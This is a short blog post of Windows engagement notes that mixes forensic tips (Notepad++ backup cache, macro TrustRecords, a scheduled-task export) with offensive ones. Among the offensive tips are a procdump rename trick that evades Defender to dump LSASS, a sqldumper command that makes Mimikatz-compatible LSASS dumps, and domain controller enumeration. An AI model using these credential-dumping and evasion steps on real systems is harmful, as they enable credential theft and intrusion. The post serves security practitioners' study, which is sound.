---
title: "Defensive Notes" 
layout: "post"
---

Some notes and tricks that helped me during engagement


# 2) Notepad cache
```powershell
[lazy]People like me use __Notepad++__ as a note-taking thing. We create a 'new', then never get around to saving them.

They get cached here:
C:\Users\{username}\AppData\Roaming\Notepad++\backup
```

# 3) Procdump.exe 

```powershell
If you rename __procdump.exe to __dump64.exe__ and place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder, you can bypass Defender and dump __LSASS__.
```

# 4) Malicious Macro Enabled

```powershell
How to prove malicious macro was enabled & clicked? 👀 #DFIR 

HKEY_LOCAL_MACHINE\USERDAT\Software\Microsoft\Office\<VERS>\<PROGRAM>\Security\Trusted Documents\TrustRecords 

Look ONLY for values where last four bytes are "FF FF FF 7F". 

These files had macros enabled
```


# 5) SQldumper LSASS


```powershell
0x01100:40 flag will create a Mimikatz compatible dump file.

sqldumper.exe 540 0 0x01100:40

Usecase: Dump LSASS.exe to Mimikatz compatible dump using PID.
```

# 6) Powershell domain control enumerations

```powershell
powershell detect domain controller 

$F = [system.directoryservices.activedirectory.Forest]::GetCurrentForest();$F.domains | ForEach-Object {$_.DomainControllers} | ForEach-Object {$_.Name + " " + $_.IPAddress}
```

# 7) Document all tasks in task scheduler
	```powershell
	$outcsv = "c:\temp\taskdef.csv" ; Get-ScheduledTask | ForEach-Object { [pscustomobject]@{ Name = $_.TaskName; Path = $_.TaskPath;LastResult = $(($_ | Get-ScheduledTaskInfo).LastTaskResult);NextRun = $(($_ | Get-ScheduledTaskInfo).NextRunTime);Status = $_.State;Command = $_.Actions.execute;Arguments = $_.Actions.Arguments }} |Export-Csv -Path $outcsv -NoTypeInformation -Force
	```